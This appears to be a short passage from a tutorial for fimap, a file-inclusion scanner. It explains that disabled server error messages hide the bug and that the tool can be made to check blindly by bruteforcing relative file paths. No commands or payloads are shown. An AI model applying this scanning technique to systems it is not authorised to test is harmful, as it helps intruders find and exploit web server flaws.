"WTF?! Why doesn't it work?! I am elite haxx0r."

Well my friend, in this case it's because the webserver has disabled any kind of error messages for us. So fimap can't see that the server has an FI-Bug.
But we can fimap tell to also check blindly for FI-Bugs by bruteforcing the relative path of the file we want to check.
Let's try it!
